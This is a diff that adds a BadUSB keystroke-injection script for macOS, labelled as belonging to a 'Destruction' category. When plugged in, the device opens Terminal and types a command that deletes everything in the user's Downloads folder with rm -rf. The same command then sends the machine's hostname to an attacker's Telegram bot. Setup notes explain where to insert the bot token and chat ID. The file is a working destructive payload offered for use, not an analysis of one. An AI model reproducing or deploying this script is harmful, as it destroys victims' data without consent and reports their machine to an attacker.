@@ -1,0 +1,22 @@
+REM Title: macOS File Deleter with Telegram
+REM Author: BadUSB Library
+REM Description: Deletes files and reports to Telegram
+REM Target: macOS 10.15+
+REM Category: Destruction
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Delete files and report
+STRING rm -rf ~/Downloads/* && curl -s -X POST "https://api.telegram.org/botTELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="TELEGRAM_CHAT_ID" -d text="Downloads deleted on $(hostname)"
+ENTER
